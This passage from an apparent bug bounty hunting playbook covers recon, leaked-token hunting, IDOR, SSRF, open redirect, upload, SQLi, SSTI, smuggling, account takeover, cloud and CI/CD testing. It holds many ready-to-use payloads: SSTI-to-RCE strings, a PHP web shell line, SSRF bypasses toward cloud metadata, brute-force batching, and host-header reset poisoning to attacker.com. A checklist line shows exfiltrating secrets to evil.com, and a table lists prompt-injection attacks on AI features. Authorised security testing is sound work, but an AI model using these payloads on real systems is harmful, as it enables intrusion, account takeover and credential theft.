gau TARGET | anew /tmp/urls.txt

# Step 4: Nuclei scan
nuclei -l /tmp/live.txt -severity critical,high,medium -silent -o /tmp/nuclei.txt

# Step 5: JS secrets
cat /tmp/urls.txt | grep "\.js$" | sort -u > /tmp/jsfiles.txt
# Run SecretFinder on each JS file
```

## Technology Fingerprinting

| Signal | Technology |
|---|---|
| Cookie: `XSRF-TOKEN` + `*_session` | Laravel |
| Cookie: `PHPSESSID` | PHP |
| Header: `X-Powered-By: Express` | Node.js/Express |
| Response: `wp-json`/`wp-content` | WordPress |
| Response: `{"errors":[{"message":` | GraphQL |
| Cookie: `ARRAffinity` | Azure App Service |
| Header: `cf-ray` | Cloudflare |
| Header: `x-akamai-*` | Akamai |

## Quick Wins Checklist
- [ ] Subdomain takeover (`subjack`, `subzy`)
- [ ] Exposed `.git` (`/.git/config`)
- [ ] Exposed env files (`/.env`, `/.env.local`)
- [ ] Default credentials on admin panels
- [ ] JS secrets (SecretFinder, jsluice)
- [ ] Open redirects (`?redirect=`, `?next=`, `?url=`)
- [ ] CORS misconfig (test `Origin: https://evil.com` + credentials)
- [ ] S3/cloud buckets
- [ ] GraphQL introspection enabled
- [ ] Spring actuators (`/actuator/env`, `/actuator/heapdump`)
- [ ] Firebase open read (`/.json`)
- [ ] Hardcoded API keys in JS bundles
- [ ] Credentials in public Git repos (GitHub, GitLab, Bitbucket)
- [ ] Exposed CI/CD dashboards (Jenkins, CircleCI, Travis CI)

## Credential Leak Hunting (H100 Pattern — 7 reports, $50K+ total)

5 of the Top 100 reports involved leaked credentials in code repos or build artifacts.

### Token Types That Pay

| Token Type | How to Find | Impact |
|------------|-------------|--------|
| GitHub Personal Access Token | `grep -r "ghp_\|github_pat_" --include="*.env" --include="*.json"` | Read/write all org repos |
| npm token | `grep -r "npm_" --include="*.npmrc" --include="*.env"` | Publish to org's npm scope |
| AWS Access Key | `grep -r "AKIA" --include="*.env" --include="*.py" --include="*.js"` | Full AWS access |
| Slack webhook | `grep -r "hooks.slack.com" --include="*.env" --include="*.yml"` | Post to any channel |
| Stripe key | `grep -r "sk_live_\|pk_live_" --include="*.env" --include="*.js"` | Payment processing |
| Docker Hub token | `grep -r "dckr_pat_" --include="*.env"` | Container registry access |
| Google API key | `grep -r "AIza" --include="*.env" --include="*.js"` | Various GCP services |

### Where to Find Leaked Tokens

**Public repos:**
```bash
# Search target's GitHub org for secrets
gh api -X GET "search/code?q=org:TARGET+filename:.env" --jq '.items[].repository.full_name'
gh api -X GET "search/code?q=org:TARGET+AKIA" --jq '.items[].html_url'

# Check for .env in compiled apps
asar extract app.asar /tmp/app
grep -r "TOKEN\|SECRET\|KEY\|PASSWORD" /tmp/app/
```

**Build logs:**
```bash
# Travis CI (Superhuman #496937 — $5K)
curl -s "https://api.travis-ci.org/repos/TARGET/REPO/builds" | jq '.[].config.raw_config'
# Look for: env.global with secrets, deploy section

# GitHub Actions logs
gh run list --repo TARGET/REPO --limit 5
gh run view RUN_ID --repo TARGET/REPO --log | grep -i "token\|secret\|key"
```

**Docker images:**
```bash
# Pull and inspect
docker pull TARGET/app:latest
docker run --rm -it TARGET/app:latest env
docker run --rm -it TARGET/app:latest cat /app/.env
```

### Token Validation PoC
```bash
# GitHub token
curl -H "Authorization: token ghp_xxxxx" https://api.github.com/user
# If 200 → valid, check repos_access, org membership

# AWS key
aws sts get-caller-identity --access-key-id AKIAxxxx --secret-access-key xxxx
# If valid → enumerate S3 buckets, IAM policies

# npm token
curl -H "Authorization: Bearer npm_xxxxx" https://registry.npmjs.org/-/whoami
# If valid → check publish access to org packages
```

## Source Code Recon
```bash
# Security surface
git log --oneline --all --grep="security\|CVE\|fix\|vuln" | head -20
grep -rn "TODO\|FIXME\|HACK\|UNSAFE" --include="*.ts" --include="*.js" | grep -iv "test"

# Dangerous patterns (JS/TS)
grep -rn "eval(\|innerHTML\|dangerouslySetInner\|execSync" --include="*.ts" --include="*.js" | grep -v node_modules
grep -rn "__proto__\|constructor\[" --include="*.js" --include="*.ts" | grep -v node_modules

# Python
grep -rn "pickle\.loads\|yaml\.load\|eval(" --include="*.py" | grep -v test
grep -rn "subprocess\|os\.system\|os\.popen" --include="*.py" | grep -v test

# PHP
grep -rn "unserialize\|eval(\|preg_replace.*e" --include="*.php"
grep -rn "\$_GET\|\$_POST\|\$_REQUEST" --include="*.php" | grep "include\|require\|file_get"

# Go
grep -rn "template\.HTML\|template\.JS\|template\.URL" --include="*.go"

# Ruby
grep -rn "YAML\.load[^_]\|Marshal\.load" --include="*.rb"

# Rust (network-facing only)
grep -rn "\.unwrap()\|\.expect(" --include="*.rs" | grep -v "test\|encode\|to_bytes\|serialize"
grep -rn "unsafe {" --include="*.rs" -B5 | grep "read\|recv\|parse\|decode"
```

---

# PHASE 2: LEARN (Pre-Hunt Intelligence)

## Disclosed Report Pipeline (knowledge.md)

At hunt start, ALWAYS check for disclosed reports on the target program:

```bash
# HackerOne Hacktivity for program
curl -s "https://hackerone.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ hacktivity_items(first:25, order_by:{field:popular, direction:DESC}, where:{team:{handle:{_eq:\"PROGRAM\"}}}) { nodes { ... on HacktivityDocument { report { title severity_rating } } } } }"}' \
  | jq '.data.hacktivity_items.nodes[].report'
```

### "What Changed" Method (Highest ROI)
1. Find disclosed report for similar tech → Get the fix commit → Read the diff → Identify the anti-pattern → Grep your target for that same anti-pattern

### 6 Key Patterns from Top Reports
1. **Feature Complexity = Bug Surface** — imports, integrations, multi-tenancy, multi-step workflows
2. **Developer Inconsistency = Strongest Evidence** — `timingSafeEqual` in one place, `===` elsewhere
3. **"Else Branch" Bug** — proxy/gateway passes raw token without validation in else path
4. **Import/Export = SSRF** — every "import from URL" feature has historically had SSRF
5. **Secondary/Legacy Endpoints = No Auth** — `/api/v1/` guarded but `/api/` isn't
6. **Race Windows in Financial Ops** — check-then-deduct as two DB operations = double-spend

## Threat Model Template
```
TARGET: _______________
CROWN JEWELS: 1.___ 2.___ 3.___
ATTACK SURFACE:
  [ ] Unauthenticated: login, register, password reset, public APIs
  [ ] Authenticated: all user-facing endpoints, file uploads, API calls
  [ ] Cross-tenant: org/team/workspace ID parameters
  [ ] Admin: /admin, /internal, /debug
HIGHEST PRIORITY (crown jewel x easiest entry):
  1.___ 2.___ 3.___
```

---

# PHASE 3: HUNT

## Note-Taking System (Never Hunt Without This)
```markdown
# TARGET: company.com -- SESSION 1

## Interesting Leads (not confirmed bugs yet)
- [14:22] /api/v2/invoices/{id} -- no auth check visible in source, testing...

## Dead Ends (don't revisit)
- /admin -> IP restricted, confirmed by trying 15+ bypass headers

## Anomalies
- GET /api/export returns 200 even when session cookie is missing
- Response time: POST /api/check-user -> 150ms (exists) vs 8ms (doesn't)

## Confirmed Bugs
- [15:10] IDOR on /api/invoices/{id} -- read+write
```

## Subdomain Type → Hunt Strategy
- **dev/staging/test**: Debug endpoints, disabled auth, verbose errors
- **admin/internal**: Default creds, IP bypass headers (`X-Forwarded-For: 127.0.0.1`)
- **api/api-v2**: Enumerate with kiterunner, check older unprotected versions
- **auth/sso**: OAuth misconfigs, open redirect in `redirect_uri`
- **upload/cdn**: CORS, path traversal, stored XSS

---

# VULNERABILITY HUNTING CHECKLISTS

## IDOR — #1 Most Paid Web2 Class

| Variant | What to Test |
|---------|-------------|
| V1: Direct | Change object ID in URL path `/api/users/123` → `/api/users/456` |
| V2: Body param | Change ID in POST/PUT JSON body `{"user_id": 456}` |
| V3: GraphQL node | `{ node(id: "base64(OtherType:123)") { ... } }` |
| V4: Batch/bulk | `/api/users?ids=1,2,3,4,5` — request multiple IDs at once |
| V5: Nested | Change parent ID: `/orgs/{org_id}/users/{user_id}` |
| V6: File path | `/files/download?path=../other-user/file.pdf` |
| V7: Predictable | Sequential integers, timestamps, short UUIDs |
| V8: Method swap | GET returns 403? Try PUT/PATCH/DELETE on same endpoint |
| V9: Version rollback | v2 blocked? Try `/api/v1/` same endpoint |
| V10: Header injection | `X-User-ID: victim_id`, `X-Org-ID: victim_org` |

### IDOR Testing Checklist
- [ ] Create two accounts (A = attacker, B = victim)
- [ ] Log in as A, perform all actions, note all IDs in requests
- [ ] Log in as B, replay A's requests with A's IDs using B's auth
- [ ] Try EVERY endpoint with swapped IDs — not just GET, also PUT/DELETE/PATCH
- [ ] Check API v1/v2 differences
- [ ] Check GraphQL schema for node() queries
- [ ] Check WebSocket messages for client-supplied IDs
- [ ] Test batch endpoints (can you request multiple IDs?)

### Creating Test Accounts (Disposable Email & Phone)

IDOR needs two accounts. Most programs require email verification; some require SMS. Don't use your real accounts — you need burner identities you fully control.

**Disposable Email (for email verification):**
| Service | Notes |
|---------|-------|
| [Guerrilla Mail](https://guerrillamail.com) | Inbox lasts 1 hour, custom addresses, API available |
| [Mailinator](https://mailinator.com) | Public inboxes, no signup, any @mailinator.com address works |
| [Temp-Mail](https://temp-mail.org) | Disposable inbox, mobile app available |
| [10MinuteMail](https://10minutemail.com) | Self-destructs after 10 min, extendable |
| [YOPmail](https://yopmail.com) | No registration, any @yopmail.com address, check any inbox |
| [Emailnator](https://emailnator.com) | Gmail-style inbox, longer-lived |

```bash
# Guerrilla Mail API — get inbox and fetch emails programmatically
curl -s "https://api.guerrillamail.com/ajax.php?f=get_email_address" | jq -r '.email_addr'
# Check inbox
curl -s "https://api.guerrillamail.com/ajax.php?f=check_email&seq=0" | jq '.list[] | "\(.mail_from): \(.mail_subject)"'
```

**Temporary Phone Numbers (for SMS verification):**
| Service | Notes |
|---------|-------|
| [SMSPool](https://smspool.net) | Paid, reliable, API, 100+ countries |
| [5SIM](https://5sim.net) | Paid, per-activation pricing, wide coverage |
| [TextVerified](https://textverified.com) | US numbers, per-verification pricing |
| [Quackr](https://quackr.io) | Free temporary numbers, limited availability |
| [ReceiveSMS](https://receivesms.co) | Free, public numbers, low reliability |
| [SMSTome](https://smstome.com) | Free, multiple countries, public inboxes |

**Workflow:**
```bash
# 1. Create Account A with disposable email
#    → Use Guerrilla Mail or Mailinator address
#    → Complete email verification
#    → If SMS required, use SMSPool or Quackr

# 2. Create Account B same way (different disposable address)

# 3. Login as A, populate account with data (orders, bookings, profile)

# 4. Login as B, replay A's requests using B's session:
curl -X GET "https://TARGET/api/v1/orders/ACCOUNT_A_ORDER_ID" \
  -H "Authorization: Bearer ACCOUNT_B_TOKEN"

# 5. If you can see A's data from B's session → IDOR confirmed
```

**Account creation tips:**
- Use `+` aliases on Gmail if the target doesn't block them: `you+accountA@gmail.com`, `you+accountB@gmail.com` — both deliver to the same inbox but look like different emails to most services
- Some programs detect disposable email domains — have a backup Gmail/Outlook ready
- For programs requiring phone + email, SMSPool is most reliable for the phone half
- Save all account credentials in your session notes — you'll need them when writing the PoC

## SSRF — Server-Side Request Forgery

### SSRF IP Bypass Table (11 Techniques)

| Bypass | Payload | Notes |
|--------|---------|-------|
| Decimal IP | `http://2130706433/` | 127.0.0.1 as single decimal |
| Hex IP | `http://0x7f000001/` | Hex representation |
| Octal IP | `http://0177.0.0.1/` | Octal 0177 = 127 |
| Short IP | `http://127.1/` | Abbreviated notation |
| IPv6 | `http://[::1]/` | Loopback in IPv6 |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
| Redirect chain | `http://attacker.com/302→169.254.169.254` | Check each hop |
| DNS rebinding | Register domain resolving to 127.0.0.1 | First check = external |
| URL encoding | `http://127.0.0.1%2523@attacker.com` | Parser confusion |
| Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①` | Unicode numerals |
| Protocol smuggling | `gopher://127.0.0.1:6379/_INFO` | Redis/other protocols |

### SSRF Impact Chain
- DNS-only = Informational (don't submit)
- Internal service accessible = Medium
- Cloud metadata readable = High (key exposure)
- Cloud metadata + exfil keys = Critical (RCE on cloud)
- Docker API accessible = Critical (direct RCE)

### Cloud Metadata Endpoints
```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP (needs Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure (needs Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## OAuth / OIDC
- [ ] Missing `state` parameter → CSRF
- [ ] `redirect_uri` accepts wildcards → ATO
- [ ] Missing PKCE → code theft
- [ ] Implicit flow → token leakage in referrer
- [ ] Open redirect in post-auth redirect → OAuth token theft chain

### Open Redirect Bypass Table (11 Techniques)

| Bypass | Payload | Notes |
|--------|---------|-------|
| Double URL encoding | `%252F%252F` | Decodes to `//` after double decode |
| Backslash | `https://target.com\@evil.com` | Some parsers normalize `\` to `/` |
| Missing protocol | `//evil.com` | Protocol-relative |
| @-trick | `https://target.com@evil.com` | target.com becomes username |
| Protocol-relative | `///evil.com` | Triple slash |
| Tab/newline injection | `//evil%09.com` | Whitespace in hostname |
| Fragment trick | `https://evil.com#target.com` | Fragment misleads validation |
| Null byte | `https://evil.com%00target.com` | Some parsers truncate at null |
| Parameter pollution | `?next=target.com&next=evil.com` | Last value wins |
| Path confusion | `/redirect/..%2F..%2Fevil.com` | Path traversal in redirect |
| Unicode normalization | `https://evil.com/target.com` | Visual confusion |

## File Upload Bypass Table

| Bypass | Technique |
|--------|-----------|
| Double extension | `file.php.jpg`, `file.php%00.jpg` |
| Case variation | `file.pHp`, `file.PHP5` |
| Alternative extensions | `.phtml`, `.phar`, `.shtml`, `.inc` |
| Content-Type spoof | `image/jpeg` header with PHP content |
| Magic bytes | `GIF89a; <?php system($_GET['c']); ?>` |
| .htaccess upload | `AddType application/x-httpd-php .jpg` |
| SVG XSS | `<svg onload=alert(1)>` |
| Race condition | Upload + execute before cleanup runs |
| Polyglot JPEG/PHP | Valid JPEG that is also valid PHP |
| Zip slip | `../../etc/cron.d/shell` in filename inside archive |

## Race Conditions
- [ ] Coupon codes / promo codes — can same code be used multiple times?
- [ ] Gift card redemption — concurrent redemptions
- [ ] Fund transfer / withdrawal — double-spend check-then-deduct
- [ ] Voting / rating limits — race past the rate limit
- [ ] OTP verification brute via race

```bash
seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' &
wait
```

### Turbo Intruder — Single-Packet Attack (All Requests Arrive Simultaneously)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # all 20 fire in a single TCP packet

def handleResponse(req, interesting):
    table.add(req)
```

## XSS — Cross-Site Scripting

### XSS Sinks (grep for these)
```javascript
// HIGH RISK
innerHTML = userInput
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)    // string form
setInterval(userInput, ...)
new Function(userInput)

// MEDIUM RISK (context-dependent)
element.src = userInput        // JavaScript URI possible
element.href = userInput
location.href = userInput
```

### XSS Chains (escalate from Medium to High/Critical)
- XSS + sensitive page (banking, admin) = High
- XSS + CSRF token theft = CSRF bypass → Critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO
- XSS in chatbot response = stored XSS chain

## Business Logic
- [ ] Negative quantities in cart
- [ ] Price parameter tampering
- [ ] Workflow skip (e.g., pay without checkout)
- [ ] Role escalation via registration fields
- [ ] Privilege persistence after downgrade

## SQL Injection

### Detection
```sql
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
'; SELECT 1/0--    -- divide by zero error reveals SQLi
```

### Modern SQLi WAF Bypass
```sql
-- Comment variation
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
-- Case variation
SeLeCt * FrOm uSeRs
```

## GraphQL
- [ ] Introspection: `{ __schema { types { name fields { name type { name } } } } }`
- [ ] Missing field-level auth: `{ node(id: "base64encoded") { ... on User { email ssn } } }`
- [ ] Batching attack (rate limit bypass): send 100 login attempts in one JSON array
- [ ] Alias-based brute: send same query with 100 aliases

### GraphQL — H100 Exploited Patterns

**Pattern 1: Missing field-level auth → Mass PII (HackerOne #489146, #792927, #2032716)**
```graphql
# Introspection — find sensitive types
{ __schema { types { name fields { name type { name } } } } }

# Query private user data without auth
{ node(id: "base64(UserType:123)") { ... on User { email name } } }

# Email enumeration via mutation
mutation { SaveCollaboratorsMutation(input: {report_id: "1", usernames: ["victim"]}) { user { email } } }
```

**Pattern 2: GraphQL batching → Rate limit bypass**
```json
[
  {"query": "mutation { login(email:\"a@test.com\",password:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"a@test.com\",password:\"pass2\") { token } }"},
  ... (1000 copies)
]
```

**Pattern 3: Alias-based brute force**
```graphql
query {
  a1: login(email: "user@test.com", password: "pass1") { token }
  a2: login(email: "user@test.com", password: "pass2") { token }
  a3: login(email: "user@test.com", password: "pass3") { token }
  # ... 100 aliases in single query
}
```

**Pattern 4: Report data leak via GraphQL (HackerOne platform itself)**
```graphql
# Leak private program details
{ PolicyPageAssetGroupsIndex(id: "gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/123") { ... } }

# Leak report attributes
{ report(id: 123) { title vulnerability_information created_at } }
```

## Cache Poisoning / Web Cache Deception
- [ ] Test `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` — unkeyed headers reflected in response
- [ ] Parameter cloaking (`?param=value;poison=xss`)
- [ ] Fat GET (body params on GET requests)
- [ ] Web cache deception (`/account/settings.css` — trick cache into storing private response)

## HTTP Request Smuggling
- [ ] CL.TE: Content-Length processed by frontend, Transfer-Encoding by backend
- [ ] TE.CL: Transfer-Encoding processed by frontend, Content-Length by backend
- [ ] H2.CL: HTTP/2 downgrade smuggling
- [ ] TE obfuscation: `Transfer-Encoding: xchunked`, tab prefix, space prefix

### CL.TE Example
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
Frontend reads Content-Length: 13 → sends all. Backend reads Transfer-Encoding → sees chunk "0" = end → "SMUGGLED" left in buffer → next user's request poisoned.

### HTTP Smuggling → Mass Session Hijack (H100 Pattern)

All 4 smuggling reports in the Top 100 used the same chain: desync → redirect → cookie theft.

**Target selection:**
- Subdomains with "b" suffix: slackb.com, admin-official.line.me (often less hardened)
- Endpoints behind CDN/reverse proxy (Akamai, Cloudflare, nginx)
- Login/authentication endpoints that issue session cookies on redirect

**The PoC pattern (Slack #737140):**
```
1. CL.TE desync on slackb.com
2. Smuggled request forces victim into GET https:// HTTP/1.1
3. Backend responds with 301 redirect to https://
4. Victim's browser follows redirect WITH Slack d cookie
5. Redirect target = Burp Collaborator
6. Collect session cookies from Collaborator
7. Impersonate any Slack user
```

**Testing checklist:**
- [ ] Send request with both Content-Length and Transfer-Encoding headers
- [ ] Use Burp Repeater "Send group in sequence" to test desync
- [ ] Monitor Burp Collaborator for incoming requests from other IPs
- [ ] Check if response timing differs between smuggled vs normal requests
- [ ] Test on subdomains, not just main domain

### Cache Poisoning → Stored XSS on Sensitive Pages (H100 Pattern)

PayPal's two reports (#488147 + #510152) proved this chain pays $18-20K.

**Attack flow:**
```
1. Identify unkeyed header reflected in response
   - X-Forwarded-Host, X-Original-URL, X-Rewrite-URL
   - Test: send request with header=evil.com, check if response changes
2. Check if response is cached (Cache-Control, CDN headers, X-Cache)
3. Poison cache with XSS payload in the unkeyed header
4. Wait for victim to visit the same URL → served poisoned cached copy
5. XSS executes in victim's browser on the sensitive page
```

**CSP Bypass patterns (from PayPal):**
- Find older JS libraries on scope domains (jQuery < 3.0, Bootstrap < 3.4.1)
- jQuery selector gadget: `<script>` → jQuery converts to DOM element → executes
- 'unsafe-eval' in CSP + jQuery = direct script execution
- Search: `grep -r "jquery" --include="*.js" | sort` on scope domains

**High-value targets for cache poisoning:**
- Login pages (paypal.com/signin) — tokens, credentials in context
- Dashboard/admin pages — session tokens, user data
- Payment/checkout pages — financial data
- Settings/profile pages — PII, API keys

## Android / Mobile Hunting
- [ ] Certificate pinning bypass (Frida/objection)
- [ ] Exported activities/receivers (AndroidManifest.xml)
- [ ] Deep link injection
- [ ] Shared preferences / SQLite in cleartext
- [ ] WebView JavaScript bridge
- [ ] Mobile API often uses older/different API version than web

### Console / Desktop Client Hunting (H100 Pattern — Valve, PlayStation)

**4 reports in Top 100 targeted game/desktop clients for RCE:**

**Valve #470520: RCE via buffer overflow in Server Info**
- Game clients parse server info responses
- Crafted server info packet → buffer overflow → arbitrary code execution
- No auth required — victim just joins a game server

**PlayStation #873614: Websites Can Run Arbitrary Code on PS Now**
- Browser-based app has access to system-level APIs
- Malicious website → JavaScript execution → system command access
- Attack vector: shared links, in-game web views

**PlayStation #826026: Use-After-Free in IPV6_2292PKTOPTIONS**
- Kernel-level vulnerability in network stack
- Malformed IPv6 packet → UAF → arbitrary kernel read/write
- Fully pre-auth, no user interaction beyond network

**Testing checklist for client-side:**
- [ ] Download client app (APK, IPA, .exe, .dmg)
- [ ] Extract and analyze: `strings`, `nm`, `otool -L`
- [ ] Check for hardcoded endpoints, API keys, debug flags
- [ ] Fuzz custom protocol parsers (server info, chat, matchmaking)
- [ ] Test deep links / URI schemes for injection
- [ ] Check if app exposes local server/API without auth
- [ ] Test WebView JavaScript bridges
- [ ] Look for deserialization of untrusted data (config files, server responses)

## SSTI — Server-Side Template Injection

### Detection Payloads
```
{{7*7}}          → 49 = Jinja2 / Twig / generic
${7*7}           → 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       → 49 = ERB (Ruby)
#{7*7}           → 49 = Mako / some Ruby
*{7*7}           → 49 = Spring (Thymeleaf)
{{7*'7'}}        → 7777777 = Jinja2 (Twig gives 49)
```

### Where to Test
- Name/bio/description fields (profile pages)
- Email templates (invoice name, username in confirmation email)
- Custom error messages
- PDF generators (invoice, report export)
- URL path parameters
- Search queries reflected in results

### SSTI → RCE Payloads
```python
# Jinja2 (Python/Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```
```php
# Twig (PHP/Symfony)
{{["id"]|filter("system")}}
```
```
# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```
```ruby
# ERB (Ruby on Rails)
<%= `id` %>
```

## LLM / AI Features (OWASP ASI01-ASI10)

| ID | Vuln Class | What to Test |
|----|-----------|-------------|
| ASI01 | Prompt injection | Override system prompt via user input |
| ASI02 | Tool misuse | Make AI call tools with attacker-controlled params |
| ASI03 | Data exfil | Extract training data / PII via crafted prompts |
| ASI04 | Privilege escalation | Use AI to access admin-only tools |
| ASI05 | Indirect injection | Poison document/URL the AI processes |
| ASI06 | Excessive agency | AI takes destructive actions without confirmation |
| ASI07 | Model DoS | Craft inputs causing infinite loops or OOM |
| ASI08 | Insecure output | AI generates XSS/SQLi/command injection in output |
| ASI09 | Supply chain | Compromised plugins/tools/MCP servers the AI calls |
| ASI10 | Sensitive disclosure | AI reveals internal configs, API keys, system prompts |

**Triage rule:** ASI alone = Informational. Must chain to IDOR/exfil/RCE/ATO for paid bounty.

## Subdomain Takeover

```bash
# Check for dangling CNAMEs
cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i "CNAME"
# Look for: github.io, heroku.com, azurewebsites.net, netlify.app, s3.amazonaws.com
```

### Quick-Kill Fingerprints
```
"There isn't a GitHub Pages site here"  → GitHub Pages
"NoSuchBucket"                          → AWS S3
"No such app"                           → Heroku
"404 Web Site not found"                → Azure App Service
```

## ATO — Account Takeover (Complete Taxonomy)

### Path 1: Password Reset Poisoning (Host Header Injection)
```bash
POST /forgot-password
Host: attacker.com
email=victim@company.com
# If reset link = https://attacker.com/reset?token=XXXX → ATO
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### Path 2: Reset Token in Referrer Leak
After clicking reset link, if page loads external resources → token in Referer header to external domain.

### Path 3: Predictable / Weak Reset Tokens
If token < 16 hex chars or numeric only → brute-forceable.

### Path 4: Token Not Expiring / Reuse
Request token → wait 2 hours → use it → still works?

### Path 5: Email Change Without Re-Authentication
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}
# If no current_password required → attacker changes email → locks out victim
```

### Path 6: OAuth Account Linking Abuse
Can you link an OAuth account from a different email to an existing account?

### Path 7: Session Fixation
GET /login → note Set-Cookie session=XYZ → Log in → does session ID change? If not = fixation.

### Path 8: Email Confirmation Bypass → SSO Takeover (H100 — Shopify #791775, #796808, #910300)

This exact pattern was reported 3 times against Shopify. The fix was incomplete each time.

**Attack flow:**
```
1. Create trial account with your-controlled email (attacker@test.com)
2. Go to profile → change email to victim@company.com
3. Shopify sends confirmation link to YOUR email (not victim's)
   - Bug: confirmation goes to the "current" email, not the "new" email
4. Click confirmation link → your account now has victim's email confirmed
5. Use Shopify SSO: your account = victim's email across all stores
6. Set master password via SSO → take over all stores using that email
```

**How to test this on any platform:**
- [ ] Create account with email A
- [ ] Change email to email B (victim)
- [ ] Where does confirmation link go? A or B?
- [ ] If it goes to A → email confirmation bypass
- [ ] Check if SSO/OAuth links accounts by email
- [ ] Can you set password for accounts that used OAuth-only login?

### Path 9: OAuth Account Linking Abuse (H100 — Uber #202781)

**Attack flow:**
```
1. Attacker initiates OAuth flow with victim's email
2. OAuth provider sends code to victim (if they have access)
3. OR: Attacker already has OAuth account linked to victim's email
4. Exchange code for token → link to attacker's primary account
5. Now attacker has victim's OAuth data on their account
```

## Cloud / Infra Misconfigs

```bash
# S3 public listing
aws s3 ls s3://target-bucket-name --no-sign-request

# S3 name brute
for name in target target-backup target-assets target-prod; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"

# Exposed admin panels
# /jenkins /grafana /kibana /swagger-ui /phpMyAdmin /.env /actuator/env
```

### Infrastructure Hunting — H100 Pattern ($10-25K per finding)

Snapchat's 3 infrastructure reports averaged $13.3K each.

**Exposed CI/CD (Snapchat #231460 — $15K, #313457 — $0)**
```bash
# Jenkins
curl -s "https://jenkins.target.com/api/json" | jq '.jobs[].name'
curl -s "https://jenkins.target.com/script" # Script console

# CircleCI
curl -s "https://circleci.com/api/v1.1/project/gh/TARGET/REPO" | jq '.[0].build_num'

# GitLab CI
curl -s "https://gitlab.target.com/api/v4/projects" | jq '.[].ci_config_path'

# Check for open build systems
for sub in jenkins ci build buildkite travis drone; do
  curl -s -o /dev/null -w "$sub: %{http_code}\n" "https://$sub.target.com/"
done
```

**Exposed Grafana (Snapchat #663628 — $10K)**
```bash
curl -s "https://grafana.target.com/api/search" | jq '.[].title'
curl -s "https://grafana.target.com/api/dashboards/db/home" | jq '.dashboard.panels[].targets'
# Grafana dashboards often contain: DB queries, internal URLs, API keys, credentials
```

**Exposed Kubernetes API (Snapchat #455645 — $25K)**
```bash
curl -sk "https://target.com:6443/api/v1/namespaces"
curl -sk "https://target.com:6443/api/v1/pods"
curl -sk "https://target.com:6443/api/v1/secrets"
# If 200 → you're in. No auth = full cluster access.
```

**Exposed Spring Actuators (LY Corp #170532 — $18K)**
```bash
curl -s "https://target.com/actuator/env" | jq '.propertySources[].properties | to_entries[] | select(.key | test("password|secret|key"))'
curl -s "https://target.com/actuator/heapdump" -o heapdump
# Analyze heapdump for secrets: jhat heapdump or Eclipse MAT
```

## CI/CD Pipeline — GitHub Actions Security

### Recon: Finding Workflow Files
```bash
find . -name "*.yml" -path "*/.github/workflows/*" | head -50

# Quick grep for dangerous patterns:
grep -rn "pull_request_target\|workflow_run" .github/workflows/
grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/
grep -rn 'GITHUB_ENV\|GITHUB_OUTPUT\|GITHUB_PATH' .github/workflows/
grep -rn 'secrets\.\|secrets: inherit' .github/workflows/

# Run sisakulint:
sisakulint scan .github/workflows/
```

### Category 1: Code Injection & Expression Safety (CICD-SEC-04)
**Root cause**: Untrusted input (`github.event.issue.title`, `github.event.pull_request.body`, branch names, commit messages) interpolated into `run:` blocks via `${{ }}` expressions.

**Taint sources** (attacker-controlled):
```
github.event.issue.title / .body
github.event.pull_request.title / .body / .head.ref
github.event.comment.body
github.event.commits.*.message / .author.name
github.event.head_commit.message
github.head_ref
```

- [ ] **Expression injection** — `${{ github.event.issue.title }}` in `run:` block = RCE
- [ ] **Environment variable injection** — untrusted input → `$GITHUB_ENV`
- [ ] **PATH injection** — untrusted input → `$GITHUB_PATH` = arbitrary binary execution
- [ ] **Argument injection** — untrusted input as CLI argument (e.g., `docker run ${{ ... }}`)
- [ ] **Request forgery (SSRF)** — attacker-controlled URL in `curl`/`wget` within workflow

### Category 2: Pipeline Poisoning & Untrusted Checkout
- [ ] **Untrusted checkout** — `actions/checkout` on `pull_request_target` without explicit safe ref
- [ ] **TOCTOU** — label-gated approval + mutable ref
- [ ] **Reusable workflow taint** — `secrets: inherit` passes all secrets to called workflow
- [ ] **Cache poisoning** — untrusted checkout → build → cache write → trusted workflow reads poisoned cache
- [ ] **Artifact poisoning** — `actions/download-artifact` from untrusted `workflow_run` without validation
- [ ] **ArtiPACKED** — `persist-credentials: true` (default) leaks `.git/config` credentials in uploaded artifacts

### Category 3: Supply Chain & Dependency Security (CICD-SEC-08)
- [ ] **Unpinned actions** — `uses: actions/checkout@v4` (mutable tag) instead of SHA pin
- [ ] **Impostor commit** — fork network allows pushing commits that appear to belong to upstream
- [ ] **Ref confusion** — ambiguous tag/branch names exploited
- [ ] **Known vulnerable actions** — check against GHSA database

### Category 4: Credential & Secret Protection
- [ ] **Secret exfiltration** — `curl https://evil.com/${{ secrets.TOKEN }}` in workflow
- [ ] **Secrets in artifacts** — uploaded artifacts contain `.env`, credentials
